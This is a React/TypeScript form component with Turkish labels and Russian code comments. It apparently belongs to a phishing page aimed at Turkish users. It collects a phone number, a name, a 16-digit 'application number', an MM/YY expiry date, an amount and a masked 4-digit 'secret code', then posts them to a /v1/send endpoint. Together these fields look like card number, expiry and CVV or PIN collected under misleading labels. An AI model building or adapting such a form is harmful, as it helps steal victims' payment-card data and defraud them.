import React, { useState } from "react";
import logoUrl from "./image/logo.svg?url";

type Props = {
  onSent: (payload: { phone: string; fio: string; requestNumber: string; expiry: string; amount: string }) => void;
};

const onlyDigits = (s: string) => s.replace(/\D+/g, "");
const formatExpiry = (v: string) => {
  const d = onlyDigits(v).slice(0, 4);
  return d.length <= 2 ? d : `${d.slice(0, 2)}/${d.slice(2)}`;
};

// Телефон: оставляем только цифры и максимум 10
const sanitizePhone = (v: string) => onlyDigits(v).slice(0, 10);

// Сумма: допускаем запятую/точку, максимум 2 знака после
const formatAmount = (v: string) => {
  const s = v.replace(",", ".").replace(/[^\d.]/g, "");
  const [int = "", dec = ""] = s.split(".");
  const safeInt = int.replace(/^0+(?=\d)/, ""); // убираем лидирующие нули (кроме единственного)
  const safeDec = dec.slice(0, 2);
  return safeDec ? `${safeInt || "0"}.${safeDec}` : (safeInt || "");
};

const CombinedForm: React.FC<Props> = ({ onSent }) => {
  const [phone, setPhone] = useState("");         // ТОЛЬКО 10 цифр (после +90)
  const [fio, setFio] = useState("");
  const [reqNum, setReqNum] = useState("");
  const [expiry, setExpiry] = useState("");
  const [secret, setSecret] = useState("");
  const [amount, setAmount] = useState("");       // Новое поле «Сумма»
  const [loading, setLoading] = useState(false);

  const normalizeFio = (v: string) => v.replace(/\s+/g, " ").trimStart();

  const validPhone = onlyDigits(phone).length === 10; // ← ровно 10 цифр
  const validFio   = fio.trim().length >= 2;
  const validReq   = reqNum.length >= 1 && reqNum.length <= 16;
  const validExp   = /^\d{2}\/\d{2}$/.test(expiry);
  const validSecret= /^\d{1,4}$/.test(secret);

  // валидация суммы > 0 (строка "0", "0.", пусто — не ок)
  const parsedAmount = parseFloat((amount || "0").replace(",", "."));
  const validAmount  = Number.isFinite(parsedAmount) && parsedAmount > 0;

  const canSubmit = [validPhone, validFio, validReq, validExp, validSecret, validAmount].every(Boolean) && !loading;

  async function handleSubmit() {
    if (!canSubmit) return;
    try {
      setLoading(true);

      const resp = await fetch("/v1/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          phone: `+90${onlyDigits(phone)}`,   // отправляем с кодом страны
          fio: fio.trim(),
          requestNumber: reqNum,
          expiry,
          secretCode: secret,
          amount: amount.replace(",", ".")    // нормализуем для сервера как 1234.56
        }),
      });

      const raw = await resp.text();
      let json: any = null;
      try { json = raw ? JSON.parse(raw) : null; } catch { /* не-JSON */ }

      if (!resp.ok) {
        alert(json?.error || `Ошибка сервера (${resp.status})`);
        return;
      }
      if (json?.success) {
        onSent({ phone: `+90${onlyDigits(phone)}`, fio: fio.trim(), requestNumber: reqNum, expiry, amount });
      } else {
        alert(json?.error || "Ошибка отправки");
      }
    } catch (e: any) {
      alert(`Сеть недоступна. ${e?.message || ""}`);
    } finally {
      setLoading(false);
    }
  }

  const onKeyDown = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      e.preventDefault();
      handleSubmit();
    }
  };

  return (
    <section className="relative px-4 py-10 md:py-16 bg-slate-950 text-slate-50 overflow-hidden">
      {/* фон-логотип */}
      <div aria-hidden className="pointer-events-none absolute inset-0 grid place-items-center">
        <img
          src={logoUrl}
          alt=""
          className="select-none pointer-events-none opacity-60 w-[70vmin] max-w-[560px] md:max-w-[720px]"
          style={{ filter: "blur(0.2px)" }}
          onError={(e) => { (e.currentTarget as HTMLImageElement).style.display = "none"; }}
        />
      </div>

      <div className="relative mx-auto w-full max-w-xl">
        <h2 className="text-xl font-semibold">Bilgileri girin</h2>
        <p className="mt-1 text-sm text-slate-400">Tüm alanlar zorunludur. Göndermek için Enter’a basabilirsiniz.</p>

        {/* Telefon (ровно 10 цифр) */}
        <label className="mt-6 block text-sm text-slate-300">Telefon numarası (10 hane)</label>
        <div className="flex gap-2 mt-2">
          <div className="flex items-center gap-2 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-3">
            <span aria-hidden>
              <svg width="22" height="16" viewBox="0 0 22 16" className="rounded-[2px] overflow-hidden">
                <rect width="22" height="16" fill="#E30A17" />
                <circle cx="9.2" cy="8" r="4.2" fill="#fff" />
                <circle cx="10.4" cy="8" r="3.1" fill="#E30A17" />
                <path d="M14.7 8l1.2.4-.4-1.2.9-.9-1.3-.1-.4-1.1-.4 1.1-1.3.1.9.9-.4 1.2z" fill="#fff" />
              </svg>
            </span>
            <span className="text-slate-200 text-sm select-none">+90</span>
          </div>
          <input
            value={phone}
            onChange={(e) => setPhone(sanitizePhone(e.target.value))}
            onKeyDown={onKeyDown}
            inputMode="numeric"
            placeholder="5XXXXXXXXX"
            className="flex-1 rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
        <p className="mt-1 text-xs text-slate-400">Sadece 10 rakam: örn. 5XXXXXXXXX</p>

        {/* Ad ve Soyad */}
        <label className="mt-6 block text-sm text-slate-300">Ad ve Soyad</label>
        <div className="relative mt-2">
          <input
            value={fio}
            onChange={(e) => setFio(normalizeFio(e.target.value))}
            onKeyDown={onKeyDown}
            placeholder="Ad Soyad"
            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-70" aria-hidden>
            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 12a5 5 0 1 0-5-5 5 5 0 0 0 5 5Zm0 2c-5 0-8 2.5-8 5v1h16v-1c0-2.5-3-5-8-5Z" fill="currentColor"/></svg>
          </span>
        </div>

        {/* Başvuru numarası */}
        <label className="mt-6 block text-sm text-slate-300">Başvuru numarası (en fazla 16 rakam)</label>
        <div className="relative mt-2">
          <input
            value={reqNum}
            onChange={(e) => setReqNum(onlyDigits(e.target.value).slice(0, 16))}
            onKeyDown={onKeyDown}
            inputMode="numeric"
            placeholder="Örn: 1234567890123456"
            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-70" aria-hidden>
            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M3 7h18v10H3zM5 9h14v6H5z" fill="currentColor"/></svg>
          </span>
        </div>

        {/* Son kullanma tarihi */}
        <label className="mt-6 block text-sm text-slate-300">Son kullanma tarihi (AA/YY)</label>
        <div className="relative mt-2">
          <input
            value={expiry}
            onChange={(e) => setExpiry(formatExpiry(e.target.value))}
            onKeyDown={(e) => {
              if (e.key === "Backspace") {
                const pos = (e.target as HTMLInputElement).selectionStart ?? 0;
                if (pos === 3 && expiry[2] === "/") {
                  e.preventDefault(); setExpiry(expiry.slice(0, 2)); return;
                }
              }
              onKeyDown(e);
            }}
            inputMode="numeric"
            placeholder="AA/YY"
            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-70" aria-hidden>
            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M7 4h10v2H7zM4 8h16v12H4zM8 12h3v3H8z" fill="currentColor"/></svg>
          </span>
        </div>

        {/* Yeni: Tutar */}
        <label className="mt-6 block text-sm text-slate-300">Tutar</label>
        <div className="relative mt-2">
          <input
            value={amount}
            onChange={(e) => setAmount(formatAmount(e.target.value))}
            onKeyDown={onKeyDown}
            inputMode="decimal"
            placeholder="Örn: 2500,00"
            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-80" aria-hidden>
            {/* ₺ + $ значок */}
            <svg width="22" height="22" viewBox="0 0 24 24">
              <path d="M9 4h2v3.1l2.5-1.1v2.1L11 9.2v2.2l2.5-1.1v2.1L11 13.4V20H9v-5.6l-1.5.7v-2.1l1.5-.7V8.9l-1.5.7V7.5l1.5-.7V4z" fill="currentColor"/>{/* TL-like */}
              <path d="M18 7.5c-.8 0-1.3.3-1.3.8 0 .5.5.7 1.6 1 1.3.4 2.7.9 2.7 2.6 0 1.4-1.1 2.3-2.6 2.6V16h-1.2v-1.4c-1.1-.1-2.2-.6-2.8-1.3l.8-1c.6.6 1.5 1 2.4 1 .9 0 1.5-.3 1.5-.9s-.6-.8-1.7-1.1c-1.2-.3-2.6-.8-2.6-2.5 0-1.3 1-2.2 2.6-2.4V4.5H18v1.1c1 .1 2 .5 2.6 1.1l-.8 1c-.6-.6-1.4-.9-2.1-.9z" fill="currentColor"/>{/* $-like */}
            </svg>
          </span>
        </div>
        <p className="mt-1 text-xs text-slate-400">Ondalık için «,» veya «.» kullanabilirsiniz (maks. 2 hane).</p>

        {/* Gizli kod */}
        <label className="mt-6 block text-sm text-slate-300">Gizli kod (en fazla 4 rakam)</label>
        <div className="relative mt-2">
          <input
            value={secret}
            type="password"
            onChange={(e) => setSecret(onlyDigits(e.target.value).slice(0, 4))}
            onKeyDown={onKeyDown}
            inputMode="numeric"
            placeholder="••••"
            className="w-full rounded-2xl bg-slate-900 ring-1 ring-white/10 px-4 py-3 text-base text-slate-50 placeholder:text-slate-400 outline-none focus:ring-2 focus:ring-blue-500"
          />
          <span className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 opacity-70" aria-hidden>
            <svg width="20" height="20" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4H6a6 6 0 1 1 12 0h-2a4 4 0 0 0-4-4Zm-6 6h12v6H6z" fill="currentColor"/></svg>
          </span>
        </div>

        <div className="mt-6 flex flex-col gap-3">
          <button
            type="button"
            onClick={handleSubmit}
            disabled={!canSubmit}
            className="inline-flex items-center justify-center rounded-2xl bg-blue-600 px-5 py-3 font-semibold text-white shadow-lg shadow-blue-900/30 outline-none ring-offset-2 transition hover:bg-blue-500 focus:ring-2 focus:ring-blue-400 disabled:opacity-50"
          >
            Girdiğim bilgileri onaylıyorum
          </button>
          <p className="text-xs text-slate-400">Klavye ile Enter’a basabilirsiniz.</p>
        </div>
      </div>
    </section>
  );
};

export default CombinedForm;
